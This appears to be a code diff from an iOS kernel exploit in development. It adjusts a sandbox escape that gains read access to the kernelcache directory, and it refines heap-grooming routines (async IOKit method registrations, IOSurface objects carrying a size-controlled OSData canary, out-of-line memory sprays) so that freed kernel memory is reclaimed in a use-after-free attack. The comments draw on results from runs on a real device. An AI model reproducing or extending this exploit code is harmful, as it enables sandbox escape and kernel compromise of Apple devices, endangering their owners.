@@ -819,7 +819,12 @@ static void stageKCE(void) {
     EV("[uaf][KCE] === stage KCE: kernelcache evidence via the sandbox escape ===");
     int64_t h = sbxRead("/System/Library/Caches");
     EV("[uaf][KCE] escape handle for /System/Library/Caches -> %lld", (long long)h);
-    if (h <= 0) { EV("[uaf][KCE] escape failed (root-owned dir, or path moved on 26.2)"); return; }
+    // the escape grants the PATH, not its subtree (the 21.11 device run:
+    // opendir com.apple.kernelcaches -> EPERM even with the Caches handle), so
+    // take a handle for the subdirectory the kernelcache actually lives in
+    int64_t h2 = sbxRead("/System/Library/Caches/com.apple.kernelcaches");
+    EV("[uaf][KCE] escape handle for com.apple.kernelcaches -> %lld", (long long)h2);
+    if (h <= 0 && h2 <= 0) { EV("[uaf][KCE] escape failed (root-owned dir, or path moved on 26.2)"); return; }
     const char *dirs[] = { "/System/Library/Caches/com.apple.kernelcaches",
                            "/System/Library/Caches", NULL };
     for (int di = 0; dirs[di]; di++) {
@@ -1332,34 +1337,70 @@ static int holdGroom(int n, uint32_t tag) {
         gGroomConn = 0; return 0;
     }
     uint64_t ref = 0xA1B2C3D4E5F60708ull;
+    int bad = 0;
     for (int i = 0; i < n && gHoldN < 512; i++) {
         mach_port_t wp = newWakePort();
         if (!wp) break;
-        uint64_t in[3] = { 0xC0FFEE5A00000000ull | (0x24ull << 16) | tag,
-                           0x1122334455667788ull, CANARY_F5 };
+        // UNIQUE id per call: with one id all 64 inserts past the first return
+        // 0xC9 (already registered) - only the first survives (the 21.11 device
+        // run showed hold=1 on round 0 and 0 on every later round)
+        uint64_t id = 0xC0FFEE5A00000000ull | (0x24ull << 16) | ((tag * 1024 + (uint32_t)i) & 0xffff);
+        uint64_t in[3] = { id, 0x1122334455667788ull, CANARY_F5 };
         kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, SEL_REG, wp, &ref, 1,
                                                    NULL, 0, in, 24, NULL, NULL, NULL, NULL);
-        if (r != KERN_SUCCESS) { dropPort(wp); continue; }
+        if (r != KERN_SUCCESS) {
+            if (bad < 3) EV("[uaf][P2] holdGroom i=%d id=%#llx -> %#x", i,
+                            (unsigned long long)id, (uint32_t)r);
+            bad++;
+            dropPort(wp);
+            continue;
+        }
         gHoldPorts[gHoldN] = wp;
-        gHoldIds[gHoldN] = in[0];
+        gHoldIds[gHoldN] = id;
         gHoldN++;
     }
     return gHoldN;
 }
 
 // surface groom: controlled-size kernel allocations (the IOSurface kext
-// allocates per-surface objects sized by the properties)
+// allocates per-surface objects sized by the properties).  The canary variant
+// adds an OSData property payload, so the kernel copies OUR bytes at a size we
+// pick - the only content+size-calibrated groom available without complex
+// mach messages (which iOS sandbox rejects here: MACH_SEND_TOO_LARGE).
 static void *gSurfs[256];
 static int gSurfN = 0;
 static void surfGroomFree(void) {
     for (int i = 0; i < gSurfN; i++) if (gSurfs[i]) CFRelease(gSurfs[i]);
     gSurfN = 0;
 }
-static int surfGroom(int n) {
+static IOSurfaceRef_ mkSurfaceProp(size_t propSz, uint32_t tag) {
+    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
+    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    uint8_t *can = calloc(1, propSz ? propSz : 8);
+    uint64_t *q = (uint64_t *)can;
+    for (size_t k = 0; k < propSz / 8; k++)
+        q[k] = 0xC0FFEE5A00000000ull | (((uint64_t)(0x50) & 0xffff) << 16) | tag;
+    CFDataRef cd = CFDataCreate(NULL, can, (CFIndex)propSz);
+    free(can);
+    const void *vk[5] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat"),
+                          CFSTR("RSGroom") };
+    const void *vv[5] = { W, H, B, P, cd };
+    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 5,
+                                           &kCFTypeDictionaryKeyCallBacks,
+                                           &kCFTypeDictionaryValueCallBacks);
+    IOSurfaceRef_ s = IOSurfaceCreate(d);
+    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(cd);
+    return s;
+}
+static int surfGroom(int n, int withCanary, uint32_t tag) {
     surfGroomFree();
     if (n > 256) n = 256;
     for (int i = 0; i < n; i++) {
-        IOSurfaceRef_ s = mkSurface();
+        IOSurfaceRef_ s = withCanary ? mkSurfaceProp(256, tag) : mkSurface();
         if (!s) continue;
         if (IOSurfaceGetID) (void)IOSurfaceGetID(s);
         gSurfs[gSurfN++] = (void *)s;
@@ -1603,7 +1644,7 @@ static void p2_unit(int u, int round) {
     // occupies, one of them covers it; the canary says which.
     int sprayed = oolSpray(64, (size_t)S, tag);
     int held = holdGroom(64, tag);
-    int surfed = (u == 3 || u == 1) ? surfGroom(32) : 0;
+    int surfed = (u == 3 || u == 1) ? surfGroom(32, 1, tag) : 0;   // 1 = with the OSData canary
     EV("[uaf][P2] unit=%d round=%d reclaim: ool=%d hold=%d surf=%d size=%d tag=%u",
        u, round, sprayed, held, surfed, S, tag);
     p2Save();
